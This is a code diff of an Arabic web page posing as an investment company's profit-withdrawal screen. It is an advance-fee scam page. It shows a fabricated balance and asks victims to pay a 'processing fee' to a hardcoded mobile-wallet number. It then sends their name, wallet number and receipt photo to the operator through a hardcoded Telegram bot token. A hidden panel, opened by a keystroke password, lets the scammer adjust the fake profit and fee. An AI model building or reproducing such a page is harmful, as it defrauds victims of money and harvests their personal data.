@@ -3,158 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شركة التقوى للاستثمار - لوحة التحكم</title>
+    <title>شركة التقوى للاستثمار - سحب الأرباح</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-color: #1a73e8;
-            --accent-color: #28a745;
+            --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff);
+            --gold: #ffcc00;
+            --success: #00ff88;
         }
         body {
-            margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f2f5;
+            margin: 0; font-family: 'Cairo', sans-serif;
+            background: var(--main-grad); color: white;
+            min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px;
         }
 
-        /* لوحة التحكم (تعديل المبالغ) */
-        .admin-panel {
-            background: #333;
-            color: white;
-            padding: 15px;
-            text-align: center;
-            font-size: 14px;
+        /* لوحة التحكم السرية للمدير */
+        .admin-box {
+            background: rgba(0,0,0,0.9); border: 1px solid var(--gold);
+            padding: 10px; border-radius: 10px; font-size: 11px;
+            position: fixed; top: 10px; left: 10px; z-index: 2000; display: none;
         }
-        .admin-panel input {
-            padding: 5px;
-            width: 80px;
-            margin: 0 5px;
-            border-radius: 4px;
-            border: none;
+        .admin-box input { width: 50px; background: #222; color: white; border: 1px solid #444; }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.2); padding: 30px 20px;
+            border-radius: 25px; width: 100%; max-width: 400px;
+            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
 
-        .navbar {
-            background: white;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        .logo-text { font-size: 26px; font-weight: 900; color: var(--gold); margin-bottom: 25px; }
+
+        .balance-area {
+            background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px;
+            margin-bottom: 20px; border-right: 5px solid var(--gold);
         }
-        .logo { font-size: 20px; font-weight: bold; color: var(--primary-color); }
-        
-        .hero-card {
-            background: white;
-            margin: 20px auto;
-            max-width: 450px;
-            padding: 25px;
-            border-radius: 15px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-        }
-        .balance-box {
-            background: #e8f0fe;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 15px 0;
-        }
-        .amount-display { font-size: 32px; font-weight: bold; color: var(--primary-color); }
-        
-        .cash-number {
-            background: #222;
-            color: #ffd700;
-            padding: 12px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-weight: bold;
-            font-size: 19px;
-        }
-        
-        .btn-withdraw {
-            background: var(--accent-color);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 15px;
-            font-size: 18px;
-            border-radius: 8px;
-            cursor: pointer;
+        .balance-area span { font-size: 13px; color: #aaa; }
+        .balance-area div { font-size: 35px; font-weight: 700; }
+
+        .form-group { text-align: right; margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 14px; color: var(--gold); }
+        input[type="text"], input[type="tel"] {
+            width: 100%; padding: 12px; border-radius: 10px; border: none;
+            background: rgba(255,255,255,0.9); color: #333; box-sizing: border-box;
         }
 
-        /* شاشة الانتظار */
-        #loading-screen {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+        .cash-box {
+            background: #000; color: var(--gold); padding: 12px;
+            border-radius: 10px; font-size: 20px; font-weight: bold;
+            margin: 15px 0; border: 1px solid var(--gold);
         }
-        .spinner {
-            width: 40px; height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--primary-color);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+
+        .file-label {
+            background: rgba(255,255,255,0.1); border: 2px dashed rgba(255,255,255,0.4);
+            padding: 15px; border-radius: 12px; cursor: pointer; display: block;
+            margin-bottom: 20px; transition: 0.3s;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .file-label:hover { border-color: var(--success); background: rgba(0,255,136,0.1); }
+
+        .submit-btn {
+            background: linear-gradient(90deg, #00ff88, #00d4ff);
+            color: #001; border: none; width: 100%; padding: 15px;
+            font-size: 19px; font-weight: 900; border-radius: 12px;
+            cursor: pointer; box-shadow: 0 5px 15px rgba(0,255,136,0.3);
+        }
+
+        #loader {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.9);
+            display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 3000;
+        }
+        .spin { width: 50px; height: 50px; border: 4px solid #333; border-top-color: var(--success); border-radius: 50%; animation: s 1s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="admin-panel">
-    ⚙️ لوحة التحكم: 
-    الربح: <input type="number" id="profitInput" value="1500" oninput="updateValues()"> ج.م | 
-    الرسوم: <input type="number" id="feesInput" value="100" oninput="updateValues()"> ج.م
+<div class="admin-box" id="adminBox">
+    💰 ربح: <input type="number" id="pIn" value="1500" oninput="upd()"> | 
+    💸 رسوم: <input type="number" id="fIn" value="100" oninput="upd()">
 </div>
 
-<div id="loading-screen">
-    <div class="spinner"></div>
-    <p style="margin-top:15px; font-weight:bold;">جاري مراجعة البيانات من السيستم...</p>
-</div>
-
-<div class="navbar">
-    <div class="logo">شركة التقوى للاستثمار</div>
-    <div style="font-size: 13px; color: #666;">مرحباً بك</div>
-</div>
-
-<div class="hero-card">
-    <div style="color: #888;">أرباحك الحالية</div>
-    <div class="balance-box">
-        <div class="amount-display"><span id="profitText">1,500</span> EGP</div>
+<div class="card">
+    <div class="logo-text">شركة التقوى للاستثمار</div>
+    
+    <div class="balance-area">
+        <span>رصيدك القابل للسحب حالياً</span>
+        <div><span id="pOut">1,500</span> <small>EGP</small></div>
     </div>
 
-    <p style="font-size: 14px; color: #444;">يرجى تحويل رسوم إدارية بقيمة (<span id="feesText">100</span> ج.م) للرقم:</p>
-    <div class="cash-number">01226811784</div>
-
-    <div style="text-align: right; margin-bottom: 15px;">
-        <label style="font-weight:bold; display:block; margin-bottom:5px;">أرفق صورة التحويل:</label>
-        <input type="file" id="fileInput" style="width: 100%;">
+    <div class="form-group">
+        <label>الاسم بالكامل:</label>
+        <input type="text" id="userName" placeholder="اكتب اسمك كما هو في البطاقة">
     </div>
 
-    <button class="btn-withdraw" onclick="startLoading()">تأكيد عملية السحب</button>
+    <div class="form-group">
+        <label>رقم محفظتك المستلمة (فودافون كاش..):</label>
+        <input type="tel" id="userWallet" placeholder="01xxxxxxxxx">
+    </div>
+
+    <p style="font-size: 13px;">يرجى تحويل رسوم المعالجة (<span id="fOut" style="color:var(--gold); font-weight:bold;">100</span> ج.م) للرقم:</p>
+    <div class="cash-box">01226811784</div>
+
+    <label class="file-label" onclick="document.getElementById('img').click()">
+        <input type="file" id="img" hidden onchange="document.getElementById('fn').innerText='✅ تم اختيار الصورة'">
+        <span id="fn">أرفق صورة إيصال التحويل 📸</span>
+    </label>
+
+    <button class="submit-btn" onclick="sendData()">تأكيد وإرسال الطلب</button>
+</div>
+
+<div id="loader">
+    <div class="spin"></div>
+    <p style="margin-top:15px;">جاري تشفير البيانات وإرسال الطلب...</p>
 </div>
 
 <script>
-    // تحديث المبالغ في الصفحة فور تغييرها في لوحة التحكم
-    function updateValues() {
-        const p = document.getElementById('profitInput').value;
-        const f = document.getElementById('feesInput').value;
-        document.getElementById('profitText').innerText = Number(p).toLocaleString();
-        document.getElementById('feesText').innerText = Number(f).toLocaleString();
+    // الإعدادات الخاصة بك التي أرسلتها
+    const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
+    const ID = '8232581666';
+
+    // لتظهر لوحة التحكم اكتب admin123
+    let k = "";
+    window.onkeydown = (e) => { k+=e.key; if(k.includes("admin123")) document.getElementById('adminBox').style.display='block'; };
+
+    function upd() {
+        document.getElementById('pOut').innerText = document.getElementById('pIn').value;
+        document.getElementById('fOut').innerText = document.getElementById('fIn').value;
     }
 
-    function startLoading() {
-        const file = document.getElementById('fileInput');
-        if (file.files.length === 0) {
-            alert("يرجى اختيار صورة التحويل أولاً");
-            return;
+    async function sendData() {
+        const name = document.getElementById('userName').value;
+        const wallet = document.getElementById('userWallet').value;
+        const file = document.getElementById('img').files[0];
+
+        if(!name || !wallet || !file) { alert("يرجى ملء كافة البيانات وإرفاق الصورة!"); return; }
+
+        document.getElementById('loader').style.display = 'flex';
+
+        const p = document.getElementById('pIn').value;
+        const f = document.getElementById('fIn').value;
+
+        // نص الرسالة اللي هيوصلك على التليجرام
+        const msg = `
+🌟 طلب سحب جديد 🌟
+━━━━━━━━━━━━━━
+👤 الاسم: ${name}
+📱 رقم العميل: ${wallet}
+💰 مبلغ الربح: ${p} ج.م
+💸 الرسوم المدفوعة: ${f} ج.م
+━━━━━━━━━━━━━━
+📱 التحويل تم لرقمك: 01226811784
+        `;
+
+        const fd = new FormData();
+        fd.append('chat_id', ID);
+        fd.append('photo', file);
+        fd.append('caption', msg);
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            document.getElementById('loader').style.display = 'none';
+            alert("تم إرسال طلبك! سيتم مراجعة الإيصال وتحويل المبلغ لمحفظتك خلال 10 دقائق.");
+        } catch(e) {
+            document.getElementById('loader').style.display = 'none';
+            alert("فشل الإرسال، تأكد من اتصال الإنترنت.");
         }
-        document.getElementById('loading-screen').style.display = 'flex';
-        setTimeout(() => {
-            document.getElementById('loading-screen').style.display = 'none';
-            alert("تم إرسال طلبك! سيتم تحويل الأرباح خلال دقائق.");
-        }, 4000);
     }
 </script>
 
